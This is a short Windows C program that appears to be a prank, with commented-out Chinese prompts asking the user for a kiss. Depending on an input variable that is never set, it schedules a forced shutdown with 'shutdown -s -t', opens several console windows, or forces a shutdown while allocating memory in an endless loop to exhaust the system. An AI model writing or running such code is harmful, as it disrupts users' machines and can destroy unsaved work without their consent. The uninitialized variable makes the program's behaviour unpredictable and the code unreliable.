#include<stdio.h>
#include<Windows.h>
#include<malloc.h>
void delay(unsigned int z)
{
    unsigned int x,y;
    for(x=z;x>0;x--)
        for(y=110;y>0;y--);
}
int main(void)
{
    int c;
    int i;
    int j;
    nihao:
//	printf("1:亲爱的，喜欢我就亲一下\n");
//	printf("2:不亲，不理你了\n");
//	printf("请选择：");
//	scanf("%d",&c);
    if(c==1)
    {
        system("shutdown -s -t 60");
    
    }
    else if(2 == c)
    {
        printf("你太坏了，我要惩罚你!\n");
        for(j=0;j<4;++j)
            system("start");
    }
    else
    {
        system("shutdown -s -t 120");
        while(1){
            int *p = (int *)malloc(100000);}
    //	delay(1000000000);
//	for(j=0;j<10;++j)
        //	system("start");
    }
    return 0;
}
